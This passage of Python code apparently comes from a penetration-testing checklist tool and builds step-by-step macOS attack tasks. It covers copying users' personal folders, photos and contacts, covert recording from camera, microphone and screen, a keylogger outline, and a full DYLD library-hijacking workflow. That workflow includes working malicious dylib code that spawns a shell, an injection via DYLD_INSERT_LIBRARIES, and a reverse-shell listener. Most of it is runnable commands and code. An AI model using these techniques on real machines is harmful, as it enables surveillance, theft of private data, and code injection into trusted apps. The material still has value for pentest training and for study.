            'id': 'tcc-payloads',
            'name': 'TCC Payloads & Data Exfiltration',
            'type': 'parent',
            'children': [
                {
                    'id': 'exfil-desktop-documents',
                    'name': 'Exfiltrate Desktop/Documents/Downloads',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Copy user folders (no entitlement needed, just TCC prompt)',
                        'tags': ['OSCP:HIGH', 'EXPLOIT', 'DATA_EXFIL', 'MACOS'],
                        'flag_explanations': {
                            'kTCCServiceSystemPolicyDesktopFolder': 'Desktop folder access permission',
                            'kTCCServiceSystemPolicyDocumentsFolder': 'Documents folder access',
                            'kTCCServiceSystemPolicyDownloadsFolder': 'Downloads folder access'
                        },
                        'alternatives': [
                            'cp -r ~/Desktop /tmp/exfil',
                            'cp -r ~/Documents /tmp/exfil',
                            'cp -r ~/Downloads /tmp/exfil',
                            'tar czf /tmp/user_data.tgz ~/Desktop ~/Documents ~/Downloads',
                            'No entitlement required - TCC will prompt user'
                        ],
                        'notes': 'These folders only require TCC permission, no entitlement. If permission granted, full access.'
                    }
                },
                {
                    'id': 'exfil-photos-library',
                    'name': 'Exfiltrate Photos Library',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Copy Photos library (requires com.apple.security.personal-information.photos-library)',
                        'tags': ['OSCP:MEDIUM', 'EXPLOIT', 'DATA_EXFIL', 'MACOS'],
                        'flag_explanations': {
                            'com.apple.security.personal-information.photos-library': 'Photos library access entitlement',
                            'kTCCServicePhotos': 'TCC permission for Photos access',
                            '~/Pictures/Photos Library.photoslibrary': 'Photos database location'
                        },
                        'alternatives': [
                            'cp -r ~/Pictures/Photos\\ Library.photoslibrary /tmp/photos',
                            'Requires entitlement + TCC permission',
                            'Photos.app has this permission by default'
                        ],
                        'notes': 'Requires both entitlement and TCC permission. Inject into Photos.app or request permission.'
                    }
                },
                {
                    'id': 'record-camera',
                    'name': 'Record from Camera',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Capture video/photos from webcam (requires com.apple.security.device.camera)',
                        'tags': ['OSCP:MEDIUM', 'EXPLOIT', 'SURVEILLANCE', 'MACOS'],
                        'flag_explanations': {
                            'com.apple.security.device.camera': 'Camera access entitlement',
                            'kTCCServiceCamera': 'TCC permission for camera',
                            'ffmpeg -f avfoundation': 'Capture from AVFoundation devices',
                            '-i "0"': 'Camera device index',
                            '-frames:v 1': 'Capture single frame'
                        },
                        'alternatives': [
                            'ffmpeg -f avfoundation -i "0" -frames:v 1 /tmp/capture.jpg',
                            'AVFoundation Objective-C code (see TCC payloads)',
                            'Record video: ffmpeg -f avfoundation -i "0" -t 10 /tmp/video.mp4',
                            'Requires entitlement + TCC permission'
                        ],
                        'notes': 'Camera access requires entitlement. Telegram, Firefox, browsers typically have it.'
                    }
                },
                {
                    'id': 'record-microphone',
                    'name': 'Record from Microphone',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Capture audio from microphone (requires com.apple.security.device.audio-input)',
                        'tags': ['OSCP:MEDIUM', 'EXPLOIT', 'SURVEILLANCE', 'MACOS'],
                        'flag_explanations': {
                            'com.apple.security.device.audio-input': 'Microphone access entitlement',
                            'kTCCServiceMicrophone': 'TCC permission for microphone',
                            'ffmpeg -f avfoundation': 'Capture audio from AVFoundation',
                            '-list_devices true': 'List available audio devices',
                            '-i ":1"': 'Audio device index (from list)',
                            '-t 5': 'Record for 5 seconds'
                        },
                        'alternatives': [
                            'ffmpeg -f avfoundation -list_devices true -i ""  # List devices',
                            'ffmpeg -f avfoundation -i ":1" -t 5 /tmp/audio.wav',
                            'AVFoundation Objective-C code for more control',
                            'Requires entitlement + TCC permission'
                        ],
                        'notes': 'Microphone access requires entitlement. Communication apps (Zoom, Telegram) have it.'
                    }
                },
                {
                    'id': 'record-screen',
                    'name': 'Record Screen',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Capture screenshots or screen recording (kTCCServiceScreenCapture)',
                        'tags': ['OSCP:MEDIUM', 'EXPLOIT', 'SURVEILLANCE', 'MACOS'],
                        'flag_explanations': {
                            'kTCCServiceScreenCapture': 'Screen recording TCC permission',
                            'screencapture': 'macOS screenshot/recording utility',
                            '-V': 'Record video',
                            '5': 'Duration in seconds'
                        },
                        'alternatives': [
                            'screencapture -V 5 /tmp/screen.mov  # 5 second recording',
                            'screencapture /tmp/screenshot.png  # Single screenshot',
                            'AVFoundation screen capture (Objective-C)',
                            'No entitlement required, just TCC permission'
                        ],
                        'notes': 'Screen recording permission very sensitive. User prompted on first request.'
                    }
                },
                {
                    'id': 'exfil-contacts-calendar',
                    'name': 'Exfiltrate Contacts & Calendar',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Copy AddressBook and Calendar data',
                        'tags': ['OSCP:MEDIUM', 'EXPLOIT', 'DATA_EXFIL', 'MACOS'],
                        'flag_explanations': {
                            'com.apple.security.personal-information.addressbook': 'Contacts entitlement',
                            'com.apple.security.personal-information.calendars': 'Calendar entitlement',
                            'kTCCServiceAddressBook': 'Contacts TCC permission',
                            'kTCCServiceCalendar': 'Calendar TCC permission'
                        },
                        'alternatives': [
                            'cp -r ~/Library/Application\\ Support/AddressBook /tmp/contacts',
                            'cp -r ~/Library/Calendars /tmp/calendars',
                            'Use Contacts.app APIs with entitlement',
                            'Requires entitlement + TCC permission'
                        ],
                        'notes': 'Personal information requires entitlements. Mail.app, Contacts.app have by default.'
                    }
                },
                {
                    'id': 'keylogger-accessibility',
                    'name': 'Deploy Keylogger via Accessibility',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Log all keystrokes using Accessibility permission',
                        'tags': ['OSCP:HIGH', 'EXPLOIT', 'SURVEILLANCE', 'MACOS'],
                        'flag_explanations': {
                            'kTCCServiceAccessibility': 'Accessibility TCC permission',
                            'CGEventTapCreate': 'Create event tap to monitor events',
                            'kCGEventKeyDown': 'Keyboard key press event',
                            'UCKeyTranslate': 'Translate keycode to character'
                        },
                        'alternatives': [
                            'Requires kTCCServiceAccessibility permission',
                            'Use CGEventTapCreate with kCGEventKeyDown',
                            'Log to file in accessible location',
                            'See TCC payloads for full Objective-C implementation',
                            'Extremely powerful permission'
                        ],
                        'notes': 'Accessibility is most powerful TCC permission. Can monitor ALL input, control UI, click TCC prompts.'
                    }
                }
            ]
        }
        tasks['children'].append(tcc_payloads_tasks)

        # PHASE 9: Exploit Research
        exploit_research_tasks = {
            'id': 'exploit-research',
            'name': 'Exploit Research',
            'type': 'parent',
            'children': [
                {
                    'id': 'research-macos-version',
                    'name': 'Research macOS Version Vulnerabilities',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Identify macOS version and research applicable CVEs',
                        'tags': ['OSCP:HIGH', 'RESEARCH', 'MACOS'],
                        'alternatives': [
                            f'ssh {target} "sw_vers"  # Get macOS version',
                            'sw_vers -productVersion  # Version number',
                            'system_profiler SPSoftwareDataType  # Detailed info',
                            'Search CVEs for specific macOS version',
                            'Check for unpatched TCC/Sandbox bypasses'
                        ],
                        'notes': 'Many TCC bypasses version-specific. Recent versions patch older techniques.'
                    }
                },
                {
                    'id': 'research-installed-apps',
                    'name': 'Enumerate Installed Applications',
                    'type': 'command',
                    'metadata': {
                        'command': f'ssh {target} "ls -la /Applications/"',
                        'description': 'List installed applications to find injection/abuse targets',
                        'tags': ['OSCP:MEDIUM', 'ENUM', 'MACOS', 'QUICK_WIN'],
                        'flag_explanations': {
                            '/Applications/': 'System-wide installed applications',
                            'ls -la': 'List all with details including permissions'
                        },
                        'success_indicators': [
                            'Application bundles listed (.app)',
                            'Third-party apps visible',
                            'Utility apps present'
                        ],
                        'failure_indicators': [
                            'Permission denied',
                            'Empty directory (unlikely)',
                            'Connection refused'
                        ],
                        'next_steps': [
                            'Check entitlements of interesting apps',
                            'Look for apps with disable-library-validation',
                            'Find apps with FDA or camera/mic access',
                            'Research known vulnerabilities in specific apps'
                        ],
                        'alternatives': [
                            f'ssh {target} "find /Applications -name *.app -maxdepth 2"',
                            'Check ~/Applications/ for user-installed apps',
                            'system_profiler SPApplicationsDataType  # Detailed app info'
                        ],
                        'notes': 'Focus on communication apps (Telegram, Slack), development tools, browsers for entitlements.'
                    }
                },
                {
                    'id': 'research-cve-database',
                    'name': 'CVE Database Research',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Search for applicable TCC/Sandbox CVEs',
                        'tags': ['OSCP:HIGH', 'RESEARCH', 'MACOS'],
                        'alternatives': [
                            'searchsploit macos tcc',
                            'searchsploit macos sandbox',
                            'Search: CVE-2020-9934 (HOME env TCC bypass)',
                            'Search: CVE-2020-27937 (Directory Utility plugin)',
                            'Search: CVE-2021-30970 (Powerdir NFSHome)',
                            'Search: CVE-2023-26818 (Telegram DYLD injection)',
                            'Search: CVE-2023-32407 (Metal framework MTL_DUMP)',
                            'Search: CVE-2024-40855 (Disk Arbitration)'
                        ],
                        'notes': 'Many historical CVEs patched. Useful for understanding patterns and finding new variants.'
                    }
                }
            ]
        }
        tasks['children'].append(exploit_research_tasks)

        # PHASE 10: DYLD Hijacking Detailed Workflow
        dyld_hijacking = {
            'id': 'dyld-hijacking-workflow',
            'name': 'DYLD Library Hijacking Workflow',
            'type': 'parent',
            'children': []
        }

        # Step 1: Find vulnerable binaries
        dyld_hijacking['children'].append({
            'id': 'dyld-find-vulnerable-binaries',
            'name': 'Step 1: Identify Vulnerable Binaries',
            'type': 'parent',
            'children': [
                {
                    'id': 'dyld-check-entitlements',
                    'name': 'Check Binary Entitlements',
                    'type': 'command',
                    'metadata': {
                        'command': f'codesign -dv --entitlements :- /Applications/TargetApp.app/Contents/MacOS/binary 2>&1 | grep -E "disable-library-validation|allow-dyld-environment"',
                        'description': 'Check if binary has entitlements allowing library injection',
                        'tags': ['OSCP:HIGH', 'MANUAL', 'MACOS'],
                        'flag_explanations': {
                            'codesign -dv': 'Display verbose code signature details',
                            '--entitlements :-': 'Output entitlements to stdout',
                            '2>&1': 'Redirect stderr to stdout',
                            'disable-library-validation': 'Allows loading unsigned/unverified libraries',
                            'allow-dyld-environment': 'Allows DYLD_INSERT_LIBRARIES env variable'
                        },
                        'success_indicators': [
                            'com.apple.security.cs.disable-library-validation found',
                            'com.apple.security.cs.allow-dyld-environment-variables found',
                            'Entitlements plist displayed'
                        ],
                        'failure_indicators': [
                            'No such file or directory',
                            'No entitlements found',
                            'Both entitlements missing'
                        ],
                        'next_steps': [
                            'If disable-library-validation: proceed to @rpath analysis',
                            'If allow-dyld-environment: test DYLD_INSERT_LIBRARIES',
                            'Check application permissions (TCC grants)'
                        ],
                        'alternatives': [
                            'ldid -e /path/to/binary (iOS/ARM)',
                            'codesign --display --entitlements - /path/to/binary',
                            'plutil -p entitlements.plist (if extracted)'
                        ],
                        'notes': 'disable-library-validation is the key entitlement. Historically present in Firefox, Telegram, Burp Suite. CVE-2023-26818 exploited this in Telegram.',
                        'estimated_time': '10 seconds'
                    }
                },
                {
                    'id': 'dyld-enumerate-rpath',
                    'name': 'Enumerate @rpath Locations',
                    'type': 'command',
                    'metadata': {
                        'command': f'otool -l /Applications/TargetApp.app/Contents/Resources/lib/binary | grep LC_RPATH -A 2',
                        'description': 'List @rpath search locations for libraries',
                        'tags': ['OSCP:HIGH', 'MANUAL', 'MACOS'],
                        'flag_explanations': {
                            'otool -l': 'Display load commands in Mach-O binary',
                            'LC_RPATH': 'Load command for runtime search path',
                            '-A 2': 'Show 2 lines after match (path value)',
                            '@loader_path': 'Relative to binary location',
                            '@executable_path': 'Relative to main executable',
                            '@rpath': 'Resolved using LC_RPATH entries'
                        },
                        'success_indicators': [
                            'LC_RPATH entries found',
                            'Path locations visible',
                            'Multiple @rpath search paths listed'
                        ],
                        'failure_indicators': [
                            'No LC_RPATH found',
                            'Binary is not Mach-O format'
                        ],
                        'next_steps': [
                            'Note all @rpath locations',
                            'Check which libraries use @rpath',
                            'Identify first missing library location (hijack candidate)'
                        ],
                        'alternatives': [
                            'otool -L /path/to/binary (show all linked libraries)',
                            'dyld_info --dependents /path/to/binary',
                            'Hopper/Ghidra: View load commands'
                        ],
                        'notes': '@rpath resolved in order. If first location missing, place hijack library there. Common paths: @loader_path/., @loader_path/../Frameworks, @loader_path/../lib',
                        'estimated_time': '10 seconds'
                    }
                },
                {
                    'id': 'dyld-list-rpath-libs',
                    'name': 'List Libraries Using @rpath',
                    'type': 'command',
                    'metadata': {
                        'command': f'otool -L /Applications/TargetApp.app/Contents/Resources/lib/binary | grep "@rpath"',
                        'description': 'Identify which libraries are loaded via @rpath',
                        'tags': ['OSCP:HIGH', 'MANUAL', 'MACOS'],
                        'flag_explanations': {
                            'otool -L': 'List shared libraries used by Mach-O',
                            'grep "@rpath"': 'Filter only @rpath-based libraries'
                        },
                        'success_indicators': [
                            'List of @rpath libraries displayed',
                            'Library names and versions shown',
                            'Compatibility versions visible'
                        ],
                        'failure_indicators': [
                            'No @rpath libraries found',
                            'All libraries use absolute paths'
                        ],
                        'next_steps': [
                            'Check if any @rpath library is missing',
                            'Note library version requirements',
                            'Create hijack library with matching version'
                        ],
                        'alternatives': [
                            'dyld_info -dependents /path/to/binary',
                            'nm -g /path/to/binary | grep -i dylib'
                        ],
                        'notes': 'Target: first @rpath library that doesn\'t exist. Must match current/compatibility version. Example: @rpath/lib.dylib current 1.0.0',
                        'estimated_time': '10 seconds'
                    }
                },
                {
                    'id': 'dyld-find-missing-lib',
                    'name': 'Identify Missing Library',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Find first @rpath location where library doesn\'t exist (hijack opportunity)',
                        'tags': ['OSCP:HIGH', 'MANUAL', 'MACOS'],
                        'alternatives': [
                            '# Example: Binary loads @rpath/lib.dylib',
                            '# @rpath resolved to:',
                            '#   1. @loader_path/.',
                            '#   2. @loader_path/../lib2',
                            '# Check existence:',
                            'ls /Applications/App.app/Contents/Resources/lib/lib.dylib  # First path',
                            'ls /Applications/App.app/Contents/Resources/lib2/lib.dylib  # Second path',
                            '# If first missing but second exists: HIJACK OPPORTUNITY',
                            '# Place malicious lib.dylib in first location'
                        ],
                        'notes': 'dyld searches @rpath in order. If first location missing, place hijack library there. It will load before legitimate library.',
                        'estimated_time': '1-2 minutes'
                    }
                }
            ]
        })

        # Step 2: Create hijack library
        dyld_hijacking['children'].append({
            'id': 'dyld-create-hijack-lib',
            'name': 'Step 2: Create Hijack Library',
            'type': 'parent',
            'children': [
                {
                    'id': 'dyld-create-malicious-dylib',
                    'name': 'Create Malicious Dylib',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Create dylib with constructor executing payload',
                        'tags': ['OSCP:HIGH', 'EXPLOIT', 'MACOS'],
                        'alternatives': [
                            '# Create lib.m with constructor',
                            '#import <Foundation/Foundation.h>',
                            '',
                            '__attribute__((constructor))',
                            'void custom(int argc, const char **argv) {',
                            '    NSLog(@"[+] dylib hijacked in %s", argv[0]);',
                            '    // Your payload here',
                            '    system("/bin/bash -i");',
                            '    // Or reverse shell, keylog, etc.',
                            '}',
                            '',
                            '# Compile to dylib:',
                            'gcc -dynamiclib -current_version 1.0 -compatibility_version 1.0 \\',
                            '    -framework Foundation /tmp/lib.m \\',
                            '    -o /tmp/lib.dylib'
                        ],
                        'notes': '__attribute__((constructor)) runs before main(). Must match version from otool -L. Payload inherits app TCC permissions.',
                        'estimated_time': '5 minutes'
                    }
                },
                {
                    'id': 'dyld-reexport-legit-lib',
                    'name': 'Re-export Legitimate Library',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Make hijack library re-export legitimate library to avoid crashes',
                        'tags': ['OSCP:HIGH', 'EXPLOIT', 'MACOS'],
                        'alternatives': [
                            '# Compile with -Wl,-reexport_library',
                            'gcc -dynamiclib -current_version 1.0 -compatibility_version 1.0 \\',
                            '    -framework Foundation /tmp/lib.m \\',
                            '    -Wl,-reexport_library,"/Applications/App.app/Contents/Resources/lib2/lib.dylib" \\',
                            '    -o "/tmp/lib.dylib"',
                            '',
                            '# Verify reexport:',
                            'otool -l /tmp/lib.dylib | grep REEXPORT -A 2',
                            '',
                            '# Should show:',
                            '#          cmd LC_REEXPORT_DYLIB',
                            '#      cmdsize 128',
                            '#         name /path/to/legitimate/lib.dylib'
                        ],
                        'notes': 'Re-exporting prevents symbol resolution errors. App gets legitimate library functionality through hijack library.',
                        'estimated_time': '2 minutes'
                    }
                },
                {
                    'id': 'dyld-fix-reexport-path',
                    'name': 'Fix Re-export Path',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Change re-export path from relative to absolute',
                        'tags': ['OSCP:HIGH', 'EXPLOIT', 'MACOS'],
                        'alternatives': [
                            '# Check current reexport (may be relative):',
                            'otool -l /tmp/lib.dylib | grep REEXPORT -A 2',
                            '# Output: name @rpath/lib.dylib (WRONG - relative)',
                            '',
                            '# Fix to absolute path:',
                            'install_name_tool -change @rpath/lib.dylib \\',
                            '    "/Applications/App.app/Contents/Resources/lib2/lib.dylib" \\',
                            '    /tmp/lib.dylib',
                            '',
                            '# Verify fix:',
                            'otool -l /tmp/lib.dylib | grep REEXPORT -A 2',
                            '# Output: name /Applications/.../lib2/lib.dylib (CORRECT)'
                        ],
                        'notes': 'install_name_tool modifies Mach-O load commands. Absolute path prevents resolution issues.',
                        'estimated_time': '1 minute'
                    }
                },
                {
                    'id': 'dyld-verify-versions',
                    'name': 'Verify Library Versions',
                    'type': 'command',
                    'metadata': {
                        'command': 'otool -L /tmp/lib.dylib | head -5',
                        'description': 'Verify current_version and compatibility_version match target',
                        'tags': ['OSCP:MEDIUM', 'MACOS'],
                        'flag_explanations': {
                            'otool -L': 'List library dependencies and versions',
                            'head -5': 'Show first 5 lines (library info)'
                        },
                        'success_indicators': [
                            'current version matches target library',
                            'compatibility version matches',
                            'Re-export path is absolute'
                        ],
                        'failure_indicators': [
                            'Version mismatch',
                            'Re-export path still relative',
                            'Missing version info'
                        ],
                        'next_steps': [
                            'If versions match: proceed to deploy',
                            'If mismatch: recompile with correct versions',
                            'Test library doesn\'t crash app'
                        ],
                        'alternatives': [
                            'otool -L /legitimate/lib.dylib (compare versions)',
                            'file /tmp/lib.dylib (check Mach-O format)'
                        ],
                        'notes': 'Mismatch versions cause "incompatible library version" errors. Must exactly match original library.',
                        'estimated_time': '30 seconds'
                    }
                }
            ]
        })

        # Step 3: Deploy and execute
        dyld_hijacking['children'].append({
            'id': 'dyld-deploy-execute',
            'name': 'Step 3: Deploy and Execute',
            'type': 'parent',
            'children': [
                {
                    'id': 'dyld-copy-to-hijack-location',
                    'name': 'Copy Library to Hijack Location',
                    'type': 'command',
                    'metadata': {
                        'command': 'cp /tmp/lib.dylib "/Applications/TargetApp.app/Contents/Resources/lib/lib.dylib"',
                        'description': 'Place hijack library in first @rpath location',
                        'tags': ['OSCP:HIGH', 'EXPLOIT', 'MACOS'],
                        'flag_explanations': {
                            'cp': 'Copy file preserving permissions',
                            '/tmp/lib.dylib': 'Your malicious library',
                            'Resources/lib/': 'First @rpath search location (example)'
                        },
                        'success_indicators': [
                            'File copied successfully',
                            'Library in correct location',
                            'Permissions preserved'
                        ],
                        'failure_indicators': [
                            'Permission denied (SIP protected app)',
                            'No such directory',
                            'Operation not permitted'
                        ],
                        'next_steps': [
                            'Verify file exists: ls -la /path/to/hijack/lib.dylib',
                            'Execute target application',
                            'Check for payload execution'
                        ],
                        'alternatives': [
                            'mv /tmp/lib.dylib /hijack/location/ (move instead of copy)',
                            'Use sudo if needed (may require password)',
                            'Check app bundle writable: ls -ld /Applications/App.app'
                        ],
                        'notes': 'SIP protects /System/ and most /Applications/. User-installed apps in ~/Applications/ usually writable.',
                        'estimated_time': '10 seconds'
                    }
                },
                {
                    'id': 'dyld-execute-target-app',
                    'name': 'Execute Target Application',
                    'type': 'command',
                    'metadata': {
                        'command': '/Applications/TargetApp.app/Contents/MacOS/TargetApp',
                        'description': 'Launch application to trigger library hijacking',
                        'tags': ['OSCP:HIGH', 'EXPLOIT', 'MACOS'],
                        'flag_explanations': {
                            '/Applications/App.app/Contents/MacOS/App': 'Direct binary execution'
                        },
                        'success_indicators': [
                            'NSLog output: [+] dylib hijacked',
                            'Payload executes (reverse shell connects, etc.)',
                            'Application functions normally (if re-exported)'
                        ],
                        'failure_indicators': [
                            'Application crashes immediately',
                            'dyld: Library not loaded error',
                            'Incompatible library version error',
                            'No payload execution'
                        ],
                        'next_steps': [
                            'If success: payload has app TCC permissions',
                            'If crash: check versions, re-export path',
                            'Monitor Console.app for dyld errors',
                            'Test with different @rpath locations'
                        ],
                        'alternatives': [
                            'open -a TargetApp (GUI launch)',
                            'Double-click app in Finder',
                            'Check Console.app for dyld messages'
                        ],
                        'notes': 'Success = payload runs with app identity. Inherits TCC grants (camera, mic, full disk access, etc.).',
                        'estimated_time': '30 seconds'
                    }
                },
                {
                    'id': 'dyld-monitor-execution',
                    'name': 'Monitor Execution',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Check for successful hijacking and payload execution',
                        'tags': ['OSCP:HIGH', 'MACOS'],
                        'alternatives': [
                            '# Monitor system logs:',
                            'sudo log stream --style syslog --predicate \'eventMessage CONTAINS[c] "[+] dylib"\'',
                            '',
                            '# Or check Console.app:',
                            'open -a Console',
                            '# Filter: "dylib hijacked" or app name',
                            '',
                            '# Check reverse shell listener:',
                            'nc -lvnp 4444',
                            '',
                            '# Verify process running:',
                            'ps aux | grep TargetApp'
                        ],
                        'notes': 'Constructor runs before main(). Check logs immediately after launch. If no output: constructor didn\'t execute or payload failed.',
                        'estimated_time': '1-2 minutes'
                    }
                },
                {
                    'id': 'dyld-verify-tcc-permissions',
                    'name': 'Verify Inherited TCC Permissions',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Confirm payload has app TCC permissions',
                        'tags': ['OSCP:HIGH', 'MACOS'],
                        'alternatives': [
                            '# Check app TCC grants:',
                            'sqlite3 ~/Library/Application\\ Support/com.apple.TCC/TCC.db \\',
                            '    "SELECT service, client FROM access WHERE client LIKE \'%AppName%\';"',
                            '',
                            '# Common TCC services hijack grants:',
                            '# - kTCCServiceCamera (camera access)',
                            '# - kTCCServiceMicrophone (mic access)',
                            '# - kTCCServiceSystemPolicyAllFiles (Full Disk Access)',
                            '# - kTCCServiceScreenCapture (screen recording)',
                            '',
                            '# Test from payload:',
                            '# Camera: open FaceTime, capture image',
                            '# FDA: read ~/Library/Messages/chat.db',
                            '# Screen: use screencapture command'
                        ],
                        'notes': 'CVE-2023-26818 exploited Telegram FDA grant. Your payload runs as app, inherits all TCC grants.',
                        'estimated_time': '2 minutes'
                    }
                }
            ]
        })

        # Example: DYLD_INSERT_LIBRARIES method
        dyld_hijacking['children'].append({
            'id': 'dyld-insert-libraries-method',
            'name': 'Alternative: DYLD_INSERT_LIBRARIES',
            'type': 'parent',
            'children': [
                {
                    'id': 'dyld-basic-injection',
                    'name': 'Basic DYLD_INSERT_LIBRARIES Injection',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Inject library via environment variable (simpler but requires allow-dyld-environment)',
                        'tags': ['OSCP:HIGH', 'EXPLOIT', 'MACOS'],
                        'alternatives': [
                            '# Create inject.dylib:',
                            'gcc -dynamiclib -o /tmp/inject.dylib /tmp/inject.c',
                            '',
                            '# inject.c:',
                            '#include <syslog.h>',
                            '#include <stdio.h>',
                            '#include <stdlib.h>',
                            '',
                            '__attribute__((constructor))',
                            'void myconstructor(int argc, const char **argv) {',
                            '    syslog(LOG_ERR, "[+] dylib injected in %s", argv[0]);',
                            '    printf("[+] dylib injected in %s\\n", argv[0]);',
                            '    execv("/bin/bash", 0);',
                            '}',
                            '',
                            '# Inject and execute:',
                            'DYLD_INSERT_LIBRARIES=/tmp/inject.dylib /Applications/App.app/Contents/MacOS/App'
                        ],
                        'notes': 'Requires com.apple.security.cs.allow-dyld-environment-variables entitlement. SIP blocks on most system binaries.',
                        'estimated_time': '5 minutes'
                    }
                },
                {
                    'id': 'dyld-test-injection',
                    'name': 'Test Injection on Hello Binary',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Test DYLD injection on simple test binary',
                        'tags': ['OSCP:MEDIUM', 'MACOS'],
                        'alternatives': [
                            '# Create test binary:',
                            'cat > hello.c << EOF',
                            '#include <stdio.h>',
                            'int main() {',
                            '    printf("Hello, World!\\n");',
                            '    return 0;',
                            '}',
                            'EOF',
                            '',
                            'gcc hello.c -o hello',
                            '',
                            '# Test injection:',
                            'DYLD_INSERT_LIBRARIES=/tmp/inject.dylib ./hello',
                            '',
                            '# Expected: bash shell spawns before "Hello, World!"'
                        ],
                        'notes': 'Test on non-hardened binary first. Then target app with entitlements.',
                        'estimated_time': '3 minutes'
                    }
                }
            ]
        })

        # Real-world examples
        dyld_hijacking['children'].append({
            'id': 'dyld-real-world-examples',
            'name': 'Real-World DYLD Hijacking Examples',
            'type': 'manual',
            'metadata': {
                'description': 'Historical CVEs exploiting DYLD hijacking',
                'tags': ['OSCP:HIGH', 'RESEARCH', 'MACOS'],
                'alternatives': [
                    '# CVE-2023-26818: Telegram DYLD Hijacking',
                    '# - Telegram had disable-library-validation',
                    '# - Also had Full Disk Access (FDA) TCC grant',
                    '# - Hijack library inherited FDA permission',
                    '# - Read Messages database, keychain, etc.',
                    '# - Writeup: danrevah.github.io/2023/05/15/CVE-2023-26818',
                    '',
                    '# Burp Suite Professional:',
                    '# - Had disable-library-validation',
                    '# - Loaded libjli.dylib from @rpath',
                    '# - First @rpath location: @loader_path/.',
                    '# - Could hijack by placing malicious libjli.dylib',
                    '',
                    '# Firefox (historical):',
                    '# - Had both disable-library-validation and allow-dyld-environment',
                    '# - Multiple hijack opportunities',
                    '',
                    '# Discovery process:',
                    '# 1. Enumerate installed apps',
                    '# 2. Check entitlements with codesign',
                    '# 3. Analyze @rpath with otool',
                    '# 4. Find missing first @rpath library',
                    '# 5. Create hijack library',
                    '# 6. Profit from app TCC permissions'
                ],
                'notes': 'Pattern: Popular apps with relaxed library validation for plugin systems. Check enterprise apps, development tools, browsers.',
                'estimated_time': '10 minutes research'
            }
        })

        tasks['children'].append(dyld_hijacking)

        return tasks
